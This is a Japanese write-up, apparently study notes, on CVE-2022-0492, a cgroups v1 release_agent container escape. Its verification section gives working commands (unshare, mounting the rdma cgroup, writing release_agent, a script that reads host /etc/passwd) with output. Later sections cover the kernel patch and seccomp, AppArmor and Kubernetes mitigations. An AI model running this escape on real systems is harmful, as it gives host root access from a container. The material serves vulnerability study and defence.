# CVE-2022-0492

# CVE-2022-0492 概要

- cgroups v1 の 特権昇格とコンテナブレイクアウトの脆弱性
- release_agent を悪用し、ホストの root 権限で任意のコマンドを実行可能
- 特権コンテナに限定されるべき設定が、capability のチェック漏れにより非特権コンテナから行える状態だった
- seccomp または AppArmor/SELinux を有効にすることで回避可能

# release_agent

- cgroup 内のプロセスの終了時に起動するプログラムを設定するファイル
  - release_agent は各 cgroup 階層のルートディレクトリに配置
  - リリースエージェントプログラムはホストの root 権限で実行される
- cgroup ディレクトリ内の notify_on_release の値で判断
  - notify_on_release = 1 の場合、リリースエージェントプログラムを起動
- cgroup v2 には release_agent がなく、リリースの通知は別の仕組みを使う

```txt
cgroup1 (root)
├── release_agent
├── notify_on_release
├── cgroup2
│   └── notify_on_release
└── cgroup3
    └── notify_on_release
```

※ もともと CAP_SYS_ADMIN があればコンテナエスケープ可能だった

https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

# エクスプロイト

### 前提条件

- root ユーザーまたは、no_new_privsフラグなしでコンテナを起動
- seccomp, AppArmor/SELinux がいずれも有効でない
- ホストの非特権ユーザー名前空間が有効（ubuntu ではデフォルト）

```bash
$ cat /proc/sys/kernel/unprivileged_userns_clone
1
```

### 要点

- コンテナから cgroups の release_agent に書き込みたい
- rdma サブシステムは root cgroup に所属しているが、readonly でマウントされている
- cgroup を rw で新たにマウントしたいが、マウントには CAP_SYS_ADMIN が必要
- unshare で user namespace を作成すれば CAP_SYS_ADMIN が得られる
- cgroup, mount namespace も同時に作成することで cgroup をマウント可能に
- rdma cgroup をマウント すると release_agent に書き込み可能
- cgroup 内のプロセスが終了するタイミングで、任意のプログラムをホストの root 権限で実行

### 検証

ubuntu 上に seccomp, AppArmor をオフにした docker コンテナを起動し、脆弱性を検証

```
# uname -a
Linux ip-172-31-1-29 5.13.0-1017-aws #19~20.04.1-Ubuntu SMP Mon Mar 7 12:53:12 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bash
```

docker はコンテナ作成時に cgroup ns を作成しないので、ホストと同じ cgroup ns に所属している

自身の cgroup を確認すれば、root cgroup に所属するサブシステムがわかる

```
root@ab988587a245:/# cat /proc/self/cgroup
13:misc:/
12:rdma:/   ← rdma サブシステムは root cgroup
11:hugetlb:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a
10:cpuset:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a
9:net_cls,net_prio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a
8:perf_event:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a
7:blkio:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a
6:devices:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a
5:freezer:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a
4:cpu,cpuacct:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a
3:pids:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a
2:memory:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a
1:name=systemd:/docker/2fe60dee4cbe58e3815f096eb1253d21bab225fb764dda97e211820883cf1a6a
0::/system.slice/containerd.service
```

コンテナにマウントされている cgroup は readonly のため、release_agent は見えるが書き込みはできない

```
root@ab988587a245:/# mount | grep 'cgroup (ro'
cgroup on /sys/fs/cgroup/systemd type cgroup (ro,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/pids type cgroup (ro,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (ro,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/freezer type cgroup (ro,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/devices type cgroup (ro,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/blkio type cgroup (ro,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/perf_event type cgroup (ro,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (ro,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (ro,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)   ← readonly でマウントされている
cgroup on /sys/fs/cgroup/misc type cgroup (ro,nosuid,nodev,noexec,relatime,misc)

root@ab988587a245:/# ls -l /sys/fs/cgroup/rdma/
total 0
-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.clone_children
-rw-r--r--  1 root root 0 Mar 15 01:40 cgroup.procs
-r--r--r--  1 root root 0 Mar 15 01:40 cgroup.sane_behavior
-rw-r--r--  1 root root 0 Mar 15 01:40 notify_on_release
-rw-r--r--  1 root root 0 Mar 29 16:01 release_agent
drwxr-xr-x 13 root root 0 Mar 26 21:07 system.slice
-rw-r--r--  1 root root 0 Mar 15 01:40 tasks

root@ab988587a245:/# echo test > /sys/fs/cgroup/rdma/release_agent 
bash: /sys/fs/cgroup/rdma/release_agent: Read-only file system
```

というわけで rw で cgroup をマウントできれば良い

ただし capability を確認すると CAP_SYS_ADMIN を持たないため、cgroup をマウントする権限がない

```
root@ab988587a245:/# apt update && apt install -y libcap2-bin

root@ab988587a245:/# cat /proc/self/status | grep CapEff
CapEff:	00000000a80425fb

root@ab988587a245:/# capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap

root@ab988587a245:/# mount -t cgroup -o rdma cgroup /mnt
mount: /mnt: permission denied.
```

CAP_SYS_ADMIN を付与するため、user ns を作成しプロセスを立ち上げる

mount, cgroup ns を同時に作成することでマウント可能になる

マウントできれば release_agent に書き込める

```
root@ab988587a245:/# unshare -rmC bash   ← user, mount, cgroup ns を作成

root@ab988587a245:/# cat /proc/self/status | grep CapEff
CapEff:	000001ffffffffff

root@ab988587a245:/# capsh --decode=000001ffffffffff
0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,38,39,40   ← CAP_SYS_ADMIN を持つ

root@ab988587a245:/# mount -t cgroup -o rdma cgroup /mnt   ← rdma サブシステムをマウント

root@ab988587a245:/# ls /mnt
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks

root@ab988587a245:/# mount | grep 'cgroup (rw'
cgroup on /mnt type cgroup (rw,relatime,rdma)
```

コンテナ内のルート (/) に、ホストの権限で実行させたいプログラムを配置

今回は /etc/passwd をコンテナ内に出力するスクリプトを作成

release_agent に設定するのはホストから見た絶対パス

```
root@ab988587a245:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

root@ab988587a245:/# echo $host_path
/var/lib/docker/overlay2/20c4102a1a817b0e564734054b876c051732c62f4993ce682508ac7cd7fcb1c6/diff   ← upperdir のパス

root@ab988587a245:/# echo "$host_path/cmd" > /mnt/release_agent

root@ab988587a245:/# echo '#!/bin/sh' > /cmd

root@ab988587a245:/# echo "cat /etc/passwd > $host_path/output" >> /cmd

root@ab988587a245:/# chmod a+x /cmd
```

cgroup 内のプロセスを空にすることで、release_agent のプログラムを実行させる

```
root@ab988587a245:/# mkdir /mnt/xx   ← child cgroup を作成

root@ab988587a245:/# ls /mnt/xx/
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks

root@ab988587a245:/# echo 1 > /mnt/xx/notify_on_release

root@ab988587a245:/# sh -c "echo \$\$" > /mnt/xx/cgroup.procs   ← すぐに終了するプロセスを child cgroup に追加

root@ab988587a245:/# cat /output
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
...
```

# 修正パッチ

https://github.com/torvalds/linux/commit/24f6008564183aa120d07c03d9289519c2fe02af

https://github.com/torvalds/linux/commit/467a726b754f474936980da793b4ff2ec3e382a7

kernel/cgroup/cgroup-v1.c

```c
  static ssize_t cgroup_release_agent_write(struct kernfs_open_file *of, char *buf, size_t nbytes, loff_t off)
  {
    struct cgroup *cgrp;
+   struct cgroup_file_ctx *ctx;

    BUILD_BUG_ON(sizeof(cgrp->root->release_agent_path) < PATH_MAX);

+   /*
+    * Release agent gets called with all capabilities,
+    * require capabilities to set release agent.
+    */
+   ctx = of->priv;
+   if ((ctx->ns->user_ns != &init_user_ns) ||
+       !file_ns_capable(of->file, &init_user_ns, CAP_SYS_ADMIN))
+     return -EPERM;

    cgrp = cgroup_kn_lock_live(of->kn, false);
```

- 修正後は release_agent への書き込み不可
- CAP_SYS_ADMIN は持つが init user namespace でないため
- init user namespace かつ CAP_SYS_ADMIN を同時に満たすのは非特権コンテナだと不可能（厳密にはそれぞれ見ている use_ns が違う）

```
# uname -r
5.17.0-051700rc7-generic

# docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bash

root@a45e44c77da9:/# unshare -rmC bash

root@a45e44c77da9:/# mount -t cgroup -o rdma cgroup /mnt

root@a45e44c77da9:/# ls /mnt
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks

root@a45e44c77da9:/# echo test > /mnt/release_agent 
bash: echo: write error: Operation not permitted
```

- 特権コンテナでは引き続きコンテナブレイクアウト可能
- 非特権コンテナにする、seccomp や AppArmor/SELinux 等の対策は必要

# コンテナセキュリティ

### seccomp

- コンテナ内で実行できるシステムコールを制限する
- unshare システムコールをブロック

```
# docker run --rm -it --security-opt apparmor=unconfined ubuntu bash

root@fb3522b81478:/# cat /proc/self/status | grep Seccomp
Seccomp:	2
Seccomp_filters:	1

root@fb3522b81478:/# unshare -rmC bash
unshare: unshare failed: Operation not permitted
```

### AppArmor (SELinux)

- ファイル操作、プログラム実行、capabilities 等を制限する
- mount namespace の作成を制限

```
# docker run --rm -it --security-opt seccomp=unconfined ubuntu bash

root@46912ffebb2c:/# cat /proc/self/attr/current 
docker-default (enforce)

root@46912ffebb2c:/# unshare -rmC bash
unshare: cannot change root filesystem propagation: Permission denied
```

# Kubernetes の場合

- seccomp や AppArmor/SELinux は環境や設定次第では OFF のため影響がある
  - ノードやコンテナランタイムで有効にする必要がある（AppArmor, SELinux）
  - Pod マニフェストに設定する必要がある（seccomp, AppArmor, SELinux）
- securityContext に適切な設定をする
  - allowPrivilegeEscalation, readOnlyRootFilesystem, capabilities など

ただし EKS, GKE を使用している場合は基本的に影響なさそう

### EKS

- Amazon Linux 2 ではコンテナ内に root cgroup がマウントされたサブシステムはない
- cgroup を新規にマウントしても release_agent は見えない

### GKE

- COS はデフォルトで AppArmor が有効になっている
- https://cloud.google.com/container-optimized-os/docs/how-to/secure-apparmor

```
$ k run ubuntu --image ubuntu -- sleep 3600
pod/ubuntu created
$ k exec -it ubuntu -- bash
root@ubuntu:/# cat /proc/self/attr/current 
cri-containerd.apparmor.d (enforce)
root@ubuntu:/# unshare -rmC bash
unshare: cannot change root filesystem propagation: Permission denied
```

# おまけ: ubuntu 21.10 に最新の Kernel (v5.17-rc7) をインストールする

https://linuxhint.com/install-linux-kernel-ubuntu/

https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.17-rc7/

```
$ wget http://mirrors.kernel.org/ubuntu/pool/main/o/openssl/libssl3_3.0.1-0ubuntu1_amd64.deb
$ sudo dpkg -i libssl3_3.0.1-0ubuntu1_amd64.deb

$ mkdir work && cd work
$ wget https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.17-rc7/amd64/linux-headers-5.17.0-051700rc7-generic_5.17.0-051700rc7.202203062330_amd64.deb
$ wget https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.17-rc7/amd64/linux-headers-5.17.0-051700rc7_5.17.0-051700rc7.202203062330_all.deb
$ wget https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.17-rc7/amd64/linux-image-unsigned-5.17.0-051700rc7-generic_5.17.0-051700rc7.202203062330_amd64.deb
$ wget https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.17-rc7/amd64/linux-modules-5.17.0-051700rc7-generic_5.17.0-051700rc7.202203062330_amd64.deb
$ sudo dpkg -i *.deb
$ reboot
```

# 参考リンク

### CVE-2022-0492

https://unit42.paloaltonetworks.jp/cve-2022-0492-cgroups/

https://sysdig.jp/blog/detecting-mitigating-cve-2021-0492-sysdig/

https://terenceli.github.io/%E6%8A%80%E6%9C%AF/2022/03/06/cve-2022-0492

https://nvd.nist.gov/vuln/detail/CVE-2022-0492

### Linux

https://lwn.net/Articles/679786/

https://www.nginx.com/blog/what-are-namespaces-cgroups-how-do-they-work/

https://linuxhint.com/install-linux-kernel-ubuntu/

https://man7.org/linux/man-pages/man7/cgroups.7.html

https://blog.tiqwab.com/2021/11/13/docker-and-cgroups.html

https://en.wikipedia.org/wiki/Seccomp

https://en.wikipedia.org/wiki/Security-Enhanced_Linux

https://manpages.ubuntu.com/manpages/xenial/man5/apparmor.d.5.html

### コンテナセキュリティ

https://container-security.dev/security/breakout-to-host.html

https://speakerdeck.com/mochizuki875/container-dev-security

https://speakerdeck.com/mochizuki875/container-seccomp

------

# 参考

https://nvd.nist.gov/vuln/detail/CVE-2022-0492

https://unit42.paloaltonetworks.jp/cve-2022-0492-cgroups/

https://sysdig.jp/blog/detecting-mitigating-cve-2021-0492-sysdig/

https://terenceli.github.io/技术/2022/03/06/cve-2022-0492

https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

https://qiita.com/awakia/items/af9b46c322905cdce1d7

https://container-security.dev/security/breakout-to-host.html

https://security.sios.com/security/os-db/container-security-info-20180925.html

https://lwn.net/Articles/679786/

https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=24f6008564183aa120d07c03d9289519c2fe02af

https://www.nginx.com/blog/what-are-namespaces-cgroups-how-do-they-work/

https://linuxhint.com/install-linux-kernel-ubuntu/

https://man7.org/linux/man-pages/man7/cgroups.7.html

https://blog.tiqwab.com/2021/11/13/docker-and-cgroups.html

https://en.wikipedia.org/wiki/Seccomp

https://en.wikipedia.org/wiki/Security-Enhanced_Linux

https://speakerdeck.com/mochizuki875/container-dev-security

https://speakerdeck.com/mochizuki875/container-seccomp

https://container-security.dev/hardening/no-new-privileges.html

https://gihyo.jp/admin/serial/01/linux_containers/0003

http://f5.pm/go-39770.html

https://man7.org/linux/man-pages/man1/unshare.1.html

https://github.com/kubernetes/kubernetes/issues/51746

https://github.com/containerd/containerd/blob/main/pkg/cri/server/container_create_linux.go#L481-L482

https://github.com/opencontainers/selinux/blob/main/go-selinux/selinux_linux.go#L946-L978

https://github.com/kubernetes/kubernetes/commit/8b7003aff4c81f124851041eafb8899ea7e83ffd

## メモ


```bash
$ cat /proc/self/status | grep CapEff
CapEff:	000001ffffffffff

$ capsh --decode=000001ffffffffff
WARNING: libcap needs an update (cap=40 should have a name).
0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,38,39,40

$ docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu bash
```

```bash
$ apt update
$ apt install libcap2-bin
$ cat /proc/self/status | grep CapEff
CapEff:	00000000a80425fb

$ capsh --decode=00000000a80425fb
WARNING: libcap needs an update (cap=40 should have a name).
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap

$ unshare -UrmC bash
$ mkdir /mnt-rdma
$ mount -t cgroup -o rdma cgroup /mnt-rdma 
$ mkdir /mnt-rdma/xx
$ cd /mnt-rdma/
$ echo 1 > xx/notify_on_release
$ host_path=`sed -n 's/.*\perdir=\(^,]*\).*/\1/p' /etc/mtab`
$ echo $host_path
/var/lib/docker/overlay2/8d77b2c11644cfbef9f927a33a553758dd381824ef88ac83672f755190268d24/diff

$ echo "$host_path/cmd" > release_agent 
bash: echo: write error: Operation not permitted
```

```bash
$ docker run --rm -it --security-opt seccomp=unconfined --security-opt apparmor=unconfined --cap-add=SYS_ADMIN --userns=host --privileged ubuntu bash
```
